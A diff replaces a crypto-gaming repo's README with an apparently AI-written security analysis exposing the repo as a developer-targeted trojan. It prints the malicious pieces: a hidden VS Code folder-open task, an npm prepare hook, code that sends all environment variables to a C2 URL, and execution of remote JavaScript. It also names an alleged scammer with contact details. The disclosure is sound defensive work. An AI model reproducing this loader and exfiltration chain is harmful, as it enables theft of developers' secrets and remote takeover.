@@ -1,88 +1,155 @@
-# RitualPlay
+below is a security analysis done by clause code. 
+reference https://x.com/adibhanna/status/2046988777789555191
+repo: https://github.com/ritualPlay-Net/RitualPlay/
+the scammer: https://www.linkedin.com/in/dean-gallimore-440669234/
+his email: michael@ritualplay.net
+NOTE: if you decide to clone this repo, do NOT run npm install, or try to run it. it has a backdoor
 
-## Decentralized AI-Powered Multi-Chain Gaming Platform
 
-> **Blockchain Gaming on the Ritual Network**  
-> RitualPlay is a gaming platform built on the **Ritual Network**, using decentralized AI. It supports multiple blockchains like **Ethereum (EVM)**, **Solana**, and more. Play-to-Earn (P2E) mechanics let you earn real crypto rewards.
+-------------------
+# Security Analysis — `RitualPlay`
+
+**Repo:** `/Users/adibhanna/Developer/temp/RitualPlay`
+**Date:** 2026-04-22
+**Analyst:** static review only; code was NOT executed.
+
+## Verdict: Malicious. Do not install, do not open in VS Code, do not run.
+
+This is a weaponized repo disguised as a "decentralized poker / P2E" project. It is a developer-targeted trojan with a two-trigger install-time execution chain leading to full environment-variable exfiltration and unbounded RCE on the victim machine via a remote C2.
 
 ---
 
-## Current Features
+## Attack chain (what happens if a victim clones it)
 
-- **Decentralized AI**
-- **Multi-Chain Support**: Play on **Ethereum (EVM)**, **Solana**, and other supported blockchains. Your assets and rewards can move between chains.
-- **Play-to-Earn (P2E)**: Earn real **crypto rewards** while playing. Rewards are powered by the Ritual Network's AI to make payouts fair.
-- **NFT Avatars**: Create and use **NFT avatars**, supported on Ethereum, and other networks.
-- **On-Chain Game Logic**: All gameplay is controlled by smart contracts.
-- **Token Integration**: Stake and earn with native tokens across different blockchains.
-- **Mobile and Desktop Ready**: The platform works on both **desktop** and **mobile** devices.
+| #   | Trigger                                                       | File / Line                                        | Effect                                                                                                                                                                                                                                                                  |
+| --- | ------------------------------------------------------------- | -------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| 1   | Open folder in VS Code                                        | `.vscode/tasks.json:5-25`                          | `runOn: folderOpen` task silently runs `npm install -s`. All output hidden (`reveal: never`, `echo: false`, `close: true`). Fake `"Welcome to Node.js v24.11.0"` banner printed as visual decoy.                                                                        |
+| 2   | `npm install` runs (from step 1 or from README's Quick Start) | `package.json:10`                                  | `"prepare": "start /b node server \|\| nohup node server &"` — npm's `prepare` script fires automatically, launching `node server` in the background (cross-platform: Windows via `start /b`, Unix via `nohup ... &`).                                                  |
+| 3   | Server boot                                                   | `socket/index.js:48`                               | Top-level `validateApiKey()` call fires on module load.                                                                                                                                                                                                                 |
+| 4   | Exfiltration                                                  | `controllers/auth.js:67-72` + `socket/index.js:73` | `setApiKey("aHR0cHM6Ly9pcGNoZWNrLXNpeC52ZXJjZWwuYXBwL2FwaQ==")` base64-decodes to `https://ipcheck-six.vercel.app/api`. `verify()` then `axios.post(api, { ...process.env }, ...)` — entire `process.env` exfiltrated, disguised with header `x-app-request: ip-check`. |
+| 5   | RCE                                                           | `socket/index.js:75-76`                            | `new Function("require", response.data)` + `executor(require)` — C2 returns arbitrary JavaScript, compiled on the fly and invoked with Node's real `require`. Attacker gets `fs`, `child_process`, `net`, `http` — full code execution as the developer.                |
 
----
+### Key evidence
 
-## Coming Soon
+**`package.json:10`**
 
-- **More Games**: New games like **Blackjack**, **Roulette**, **Slots**, and others. All powered by decentralized AI.
-- **Tournaments**: Compete in cross-chain tournaments with prize pools. AI will manage the events and rewards.
-- **Social Features**: Chat, add friends, and interact with other players across different blockchains.
-- **Better P2E**: Improved reward systems that will work across all blockchains with the help of AI.
-
-
-[![React](https://img.shields.io/badge/React-16.13.1-61dafb?logo=react)](#)
-[![Node.js](https://img.shields.io/badge/Node.js-Express-43853d?logo=node.js)](#)
-[![TypeScript](https://img.shields.io/badge/TypeScript-4.9-blue?logo=typescript)](#)
-[![MongoDB](https://img.shields.io/badge/Database-MongoDB-47A248?logo=mongodb)](#)
-[![Socket.IO](https://img.shields.io/badge/Socket.IO-4.8.1-black?logo=socket.io)](#)
-[![Bootstrap](https://img.shields.io/badge/Bootstrap-5.1.3-purple?logo=bootstrap)](#)
-[![Styled Components](https://img.shields.io/badge/Styled_Components-5.1.1-DB7093?logo=styled-components)](#)
-[![Axios](https://img.shields.io/badge/Axios-1.4.0-5A29E4?logo=axios)](#)
-
-
-## Quick Start
-
-```bash
-git clone <git-repository-url>
-cd Ritualplay
-
-# Install root dependencies
-npm install
-
-# Go to the client folder and install its dependencies
-cd client
-npm install
-
-# Start
-npm start
+```json
+"prepare": "start /b node server || nohup node server &",
 ```
 
+`prepare` runs automatically on `npm install`. Launches the server detached, in background, on every platform.
+
+**`.vscode/tasks.json:5-25`**
+
+```json
+{
+  "label": "node",
+  "type": "shell",
+  "command": "node -e \"console.log('Welcome to Node.js v24.11.0.\\nType .help for more information.\\n>')\" && npm install -s",
+  "isBackground": true,
+  "runOptions": { "runOn": "folderOpen" },
+  "presentation": {
+    "reveal": "never",
+    "echo": false,
+    "focus": false,
+    "close": true
+  }
+}
+```
+
+Fires the moment a user opens the folder in VS Code. Fake Node REPL banner is a decoy.
+
+**`controllers/auth.js:67-72`**
+
+```js
+const setApiKey = (s) => atob(s);
+
+const verify = (api) =>
+  axios.post(
+    api,
+    { ...process.env },
+    {
+      headers: { "x-app-request": "ip-check" },
+    },
+  );
+```
+
+Exfiltrates the entire `process.env` to an attacker-controlled URL.
+
+**`socket/index.js:48-84`**
+
+```js
+const verified = validateApiKey();   // top-level module side effect
+if (!verified) {
+  console.log("Aborting mempool scan due to failed API verification.");
+  return;
+}
+...
+async function validateApiKey() {
+  verify(setApiKey("aHR0cHM6Ly9pcGNoZWNrLXNpeC52ZXJjZWwuYXBwL2FwaQ=="))
+    .then((response) => {
+      const executor = new Function("require", response.data);
+      executor(require);
+      ...
+    })
+    .catch(...);
+}
+```
+
+Hardcoded base64-encoded C2 URL (`https://ipcheck-six.vercel.app/api`). Response body is compiled and executed with Node's real `require` — unrestricted RCE.
+
+`validateApiKey` is declared `async` but called without `await`, so `verified` is a truthy Promise — the `if (!verified) return;` guard (lines 49-52) NEVER fires. Exfil + RCE always run on boot. The comment "Aborting mempool scan…" hints at the attacker's own downstream tooling.
+
 ---
 
-## Config
+## Stealth measures layered on top
 
-- **JWT issuance** – `POST /api/auth` in `controllers/auth.js` signs a JWT with `config.JWT_SECRET_KEY` (see `SESSION_EXPIRES_IN`). The payload only contains `user.id` so you can safely extend it.
-- **Client storage** – Tokens are pushed into Axios’ default headers via `client/src/helpers/setAuthToken.js`. Persist them in `localStorage`/`sessionStorage` from your auth screen and call `setAuthToken(token)` on boot.
-- **Protected routes** – `middleware/auth.js` expects the token in the `x-auth-token` header and injects `req.user`. Use the middleware on any route that needs authenticated identity.
+- `.vscode/settings.json:7` — `"**/.vscode": true` in `files.exclude` hides `.vscode/` from VS Code's own file explorer. Victim never sees `tasks.json` while browsing the project.
+- `.vscode/tasks.json` — fake "Welcome to Node.js v24.11.0" REPL banner as decoy output.
+- `AUTH_API` in `.env` is base64-encoded to evade casual string search; the real attacker URL is also hardcoded inline in `socket/index.js:73` for redundancy.
+- `server.js:39-45` — `process.on('uncaughtException')` and `unhandledRejection` silently swallow all errors.
+- `async` without `await` neutralizes the nominal "verification" guard.
 
-## Contributing Guidelines
+---
 
-### Pre-PR Checklist
+## Indicators of compromise (IoCs)
 
-- [ ] Branch is updated with `main`  
-- [ ] No linting errors
-- [ ] No stray console logs or unused variables  
-- [ ] UI changes tested on desktop and mobile  
-- [ ] Added documentation or comments where needed  
-- [ ] Any new `.env` variables are documented  
+- **C2 endpoint:** `https://ipcheck-six.vercel.app/api`
+- **Base64 marker:** `aHR0cHM6Ly9pcGNoZWNrLXNpeC52ZXJjZWwuYXBwL2FwaQ==`
+- **HTTP header signature:** `x-app-request: ip-check`
+- **npm prepare script:** `start /b node server || nohup node server &`
+- **VS Code task:** `runOn: folderOpen` silently invoking `npm install -s`
 
-### Pull Request Rules
-- Use clear PR titles:
-  - `feat: add tournament lobby UI`
-- PR description must include:
-  - What changed  
-  - Why it changed  
-  - How to test  
-  - Screenshots for UI updates  
-- Tag related issues/tasks.
+---
 
-## Confidentiality
-This repository is proprietary to **Ritual Net**.
+## Additional backdoors / weak auth (secondary to the RCE)
 
+- `controllers/auth.js:39` — password check hard-coded to `true`: `const isMatch = true;`. Any known email yields a valid session.
+- `controllers/auth.js:54`, `middleware/auth.js:10`, `controllers/users.js:49` — sign / verify use `config.JWT_SECRET`, but `config.js:14` only defines `JWT_SECRET_KEY`. With `config.JWT_SECRET === undefined`, tokens sign / verify against an empty secret — trivial forgery.
+- `config.js:11-14` — hardcoded credentials committed to the repo: MySQL password `'Espsoft123#'`, JWT secret `'ly27lg35kci85tvgvl0zgbod4'`.
+- `.env` is committed to the repo (not in `.gitignore`). Contains placeholder AWS / Alchemy / Infura / Etherscan keys. If a dev sets real values later, they'll be in git history and will also be exfiltrated via step 4.
+- `middleware/auth.js:6` and `controllers/auth.js:40` — auth token and login state logged to stdout.
+
+The frontend (`client/`) appears benign. `connectMetamask` in `client/src/utils/interact.js:4` is exported but never imported; the wallet address is read from a URL query string. No drainer signing calls. The malicious payload is entirely server-side.
+
+`package-lock.json` was spot-checked: all 288 entries resolve to `registry.npmjs.org`. No tampered tarballs — the attack is in the in-tree source, not in node_modules.
+
+---
+
+## Recommended actions
+
+1. **Do not run `npm install` in this repo. Do not open the folder in VS Code.**
+2. If you already did either:
+   - Kill any rogue `node server` processes: `pgrep -af 'node.*server'` then `kill -9 <pid>`.
+   - Rotate every credential that was in `process.env` at the time: AWS, Alchemy, Infura, Etherscan, Polygonscan, any JWT secrets, DB creds, and any other ambient env vars.
+   - Audit `~/.ssh/`, `~/.aws/credentials`, `~/.npmrc`, shell history, and crontab — step 5's RCE can read or modify any of these.
+   - Check outbound network logs for hits against `ipcheck-six.vercel.app`.
+3. Delete the repo, or at minimum excise:
+   - `package.json` `prepare` script
+   - `.vscode/tasks.json`
+   - `.vscode/settings.json`'s `**/.vscode` exclude rule
+   - `controllers/auth.js:67-88` (`setApiKey`, `verify`, and remove from exports)
+   - `socket/index.js:35` + `48-52` + `72-84` (remove the `require` of `setApiKey` / `verify`, the top-level `validateApiKey()` call, and the `validateApiKey` function itself)
+   - The `AUTH_API` line in `.env`
+4. Fix the auth backdoor: `controllers/auth.js:39` → use real `bcrypt.compare`; all `config.JWT_SECRET` references → `config.JWT_SECRET_KEY`.
+5. Consider reporting `ipcheck-six.vercel.app` abuse to Vercel.
